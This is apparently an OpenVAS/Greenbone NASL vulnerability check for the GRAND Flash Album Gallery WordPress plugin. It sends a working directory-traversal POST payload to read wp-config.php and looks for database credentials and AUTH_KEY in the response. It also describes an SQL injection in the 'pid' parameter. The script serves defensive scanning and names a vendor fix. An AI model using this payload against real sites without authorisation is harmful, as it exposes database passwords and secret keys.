# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802015");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/43648/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16947/");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/file_content_disclosure_in_grand_flash_album_gallery_wordpress_plugin.html");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/sql_injection_in_grand_flash_album_gallery_wordpress_plugin.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary
  files via directory traversal attacks and gain sensitive information via SQL Injection attack.");

  script_tag(name:"affected", value:"WordPress GRAND Flash Album Gallery Version 0.55.");

  script_tag(name:"insight", value:"The flaws are due to

  - input validation error in 'want2Read' parameter to 'wp-content/plugins/
  flash-album-gallery/admin/news.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.

  - improper validation of user-supplied input via the 'pid' parameter to
  'wp-content/plugins/flash-album-gallery/lib/hitcounter.php', which allows
  attackers to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Update to version 1.76 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"WordPress GRAND Flash Album Gallery Plugin is prone to multiple vulnerabilities.");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/flash-album-gallery");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

useragent = http_get_user_agent();
postData = "want2Read=..%2F..%2F..%2F..%2Fwp-config.php&submit=submit";
path = dir + "/wp-content/plugins/flash-album-gallery/admin/news.php";

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name( port:port );

req = string("POST ", path, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData),
             "\r\n\r\n", postData);
res = http_send_recv(port:port, data:req);

if(ereg(pattern:"^HTTP/1\.[01] 200", string:res) && "DB_NAME" ><
   res && "DB_USER" >< res && "DB_PASSWORD" >< res && "AUTH_KEY" >< res) {
  report = http_report_vuln_url(port:port, url:path);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
